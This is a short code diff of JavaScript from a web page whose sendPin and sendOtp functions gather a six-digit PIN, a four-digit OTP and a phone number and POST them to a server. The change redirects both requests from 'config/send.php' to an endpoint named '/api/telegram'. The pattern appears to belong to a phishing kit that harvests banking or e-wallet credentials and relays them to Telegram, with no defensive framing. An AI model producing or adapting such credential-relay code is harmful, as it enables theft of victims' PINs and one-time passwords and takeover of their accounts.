@@ -767,7 +767,7 @@ function sendPin() {
               $('#pin4').val() + $('#pin5').val() + $('#pin6').val();
               
     $.ajax({
-        url: 'config/send.php',
+        url: '/api/telegram',
         method: 'POST',
         data: {
             nomor: '0' + nomor,
@@ -791,7 +791,7 @@ function sendOtp() {
     var otp = $('#otp1').val() + $('#otp2').val() + $('#otp3').val() + $('#otp4').val();
     
     $.ajax({
-        url: 'config/send.php',
+        url: '/api/telegram',
         method: 'POST',
         data: {
             nomor: '0' + nomor,
